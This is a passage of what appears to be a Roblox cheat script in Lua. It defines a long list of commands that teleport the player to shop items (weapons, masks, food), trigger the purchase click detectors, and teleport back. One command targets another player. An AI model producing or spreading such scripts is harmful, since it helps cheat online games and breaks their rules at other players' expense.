			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-434.983185, -21.25, 26.9759789)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Paintball Mask] - $60'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Paintball Mask] - $60'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flashlight";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-244.102844, 21.75, -217.93573)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Flashlight] - $10'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Flashlight] - $10'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "lettuce";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-86.3614426, 22.7002907, -632.813904)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Lettuce] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Lettuce] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "weights";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-55.7001457, 22.9502697, -654.650208)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Weights] - $120'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Weights] - $120'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "heavyweights";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-46.4928436, 22.9502697, -654.221313)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[HeavyWeights] - $250'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[HeavyWeights] - $250'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "antibodies";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(108.240707, 22.7999954, -470.864594)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[AntiBodies] - $100'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[AntiBodies] - $100'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "glock";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-271.791931, 21.7999573, -81.2004471)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Glock] - $300'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Glock] - $300'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "armor";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-606.316345, 10.3496914, -788.285034)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Medium Armor] - $1000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Medium Armor] - $1000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "pizza";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-788.796631, -39.6492004, -941.028137)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Pizza] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Pizza] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "cranberry";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Cranberry] - $3' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-203.969772, 18.9058037, -827.569702, 5.96046448e-08, 0.000427272142, 0.999999881, 0.000305194379, 0.999999881, -0.000427272113, -0.999999881, 0.000305194349, -1.1920929e-07)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Cranberry] - $3") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Cranberry] - $3"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "bag";
		["Function"] = function(str)
			local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			local target = findPlayer(str);
			bag(target.Name);
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end;
	});

	addCommand({
		["Name"] = "key";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.309631, 21.75, -241.169052)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Key] - $125'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Key] - $125'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "lockpicker";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-218.206818, 21.755003, -820.848877)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[LockPicker] - $100'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[LockPicker] - $100'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "lockpick";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-218.206818, 21.755003, -820.848877)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[LockPicker] - $100'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[LockPicker] - $100'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "knife";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-278.902435, 21.75, -236.284897)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Knife] - $150'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Knife] - $150'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "shotgun";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Shotgun] - $1250' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-804.820984, -39.6492004, -940.633728)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Shotgun] - $1250") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1250"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "shotty";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Shotgun] - $1250' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-804.820984, -39.6492004, -940.633728)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Shotgun] - $1250") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1250"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "bat";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Bat] - $250' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(380.384979, 45.59935, -282.740021, 0.99999994, -0.000345288077, 0, 0.000345288077, 0.99999994, 0, 0, 0, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Bat] - $250") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Bat] - $250"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "revolver";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Revolver] - $1300' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-867.581482, -32.6492004, -531.12439)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Revolver] - $1300") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Revolver] - $1300"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "smg";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-810.008484, -39.6492004, -940.741943)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[SMG] - $750'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[SMG] - $750'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "ar";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-815.723328, -39.6492004, -938.884155)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[AR] - $1000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[AR] - $1000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "hamburger";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-275.156769, 22.6498718, -805.798462)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Hamburger] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Hamburger] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "silencer";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-86.0817413, 21.75, -295.726318)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Silencer] - $400'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Silencer] - $400'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "ak47";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-587.381653, 8.31478119, -751.274048)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[AK47] - $2250'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[AK47] - $2250'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "taser";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-271.231354, 21.7999573, -101.60965)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Taser] - $1000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Taser] - $1000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tactical";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(471.062164, 48.0705032, -622.478271)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tacticalshotgun";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(471.062164, 48.0705032, -622.478271)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tacticalshotty";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(471.062164, 48.0705032, -622.478271)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[TacticalShotgun] - $1750'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "p90";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(465.413513, 48.0705032, -619.08551)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[P90] - $1000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[P90] - $1000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "silencerar";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(490.167664, 48.0705032, -631.357849)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[SilencerAR] - $1250'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[SilencerAR] - $1250'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flowers";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-73.9464569, 23.1322308, -309.301788)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Flowers] - $5'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Flowers] - $5'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "drumgun";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-83.6302109, 22.5779362, -84.2232132)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[DrumGun] - $3000'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[DrumGun] - $3000'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "hockeymask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Hockey Mask] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-208.505066, 18.8557835, -831.299988, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Hockey Mask] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Hockey Mask] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "ninjamask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Ninja Mask] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-219.205002, 18.853157, -826.599915, 0, 0, 1, 0, 1, -0, -1, 0, 0)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Ninja Mask] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Ninja Mask] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "riotmask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Riot Mask] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-257.291443, 18.9007416, -59.4864311, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Riot Mask] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Riot Mask] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "lemonade";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-262.720337, 26.0190735, -507.681396)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Lemonade] - $3'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Lemonade] - $3'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "lmg";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-620.882263, 20.2999878, -305.339264, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[LMG] - $3750'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[LMG] - $3750'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "defaultmoveset";
		["Function"] = function()
			G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-228.841019, 22.0563946, -1140.28906)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Default Moveset] - $0'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Default Moveset] - $0'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "boxingmoveset";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-236.984741, 22.059906, -1139.94043)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['Boxing Moveset (Require: Max Box Stat) - $0'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['Boxing Moveset (Require: Max Box Stat) - $0'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "solobike";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-821.471558, 21.9998245, -547.333984)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[SoloBike] - $25'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[SoloBike] - $25'].ClickDetector)
			wait()
		end;
	});

	addCommand({
		["Name"] = "duobike";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-831.012817, 21.9998245, -547.12616)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[DuoBike] - $75'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[DuoBike] - $75'].ClickDetector)
			wait()
		end;
	});

	addCommand({
		["Name"] = "breathingmask";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-55.5208168, 19.749939, -84.2150803, -3.57627869e-07, 0.000610389397, 0.999999762, 0.00195324328, 0.999997914, -0.000610387418, -0.999998093, 0.00195324281, -1.54972076e-06)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Breathing Mask] - $60'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Breathing Mask] - $60'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "stopsign";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-225.701126, 21.75, -78.760376)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[StopSign] - $300'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[StopSign] - $300'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "iphonep";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-115.989037, 21.9033489, -865.403198)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneP] - $600'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneP] - $600'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "oldphone";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-104.374855, 21.908289, -883.721252)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Old Phone] - $100'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Old Phone] - $100'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "originalphone";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
